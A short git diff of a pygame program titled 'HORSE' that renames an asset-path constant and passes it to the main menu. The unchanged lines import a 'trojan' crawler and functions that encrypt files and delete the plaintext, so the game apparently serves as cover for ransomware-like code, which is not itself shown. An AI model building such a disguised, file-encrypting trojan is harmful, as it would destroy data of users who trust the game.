@@ -9,12 +9,7 @@ from game.menu.main_menu import main_menu
 from trojan.crawler import Crawler
 from trojan.crypto import encryptAndDeletePlaintext, decryptAndDeleteCipherText
 
-PATH_TO_DIR = pathlib.Path(__file__).parent.absolute()
-
-# load image assets
-main_menu_bkground = pygame.image.load(
-    f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}main_menu_background.png"
-)
+PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()
 
 """
 Subroutine that runs if this is the child process.
@@ -31,12 +26,12 @@ def game():
     window = pygame.display.set_mode((800, 600), 0, 32)
     pygame.display.set_caption("HORSE")
     window_icon = pygame.image.load(
-        f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}app_icon.png"
+        f"{PATH_TO_ROOT}{os.sep}assets{os.sep}menu{os.sep}app_icon.png"
     )
     pygame.display.set_icon(window_icon)
 
     # Start the main menu
-    main_menu(window, main_clock, main_menu_bkground)
+    main_menu(window, main_clock, PATH_TO_ROOT)
 
     # Clean up
     pygame.quit()
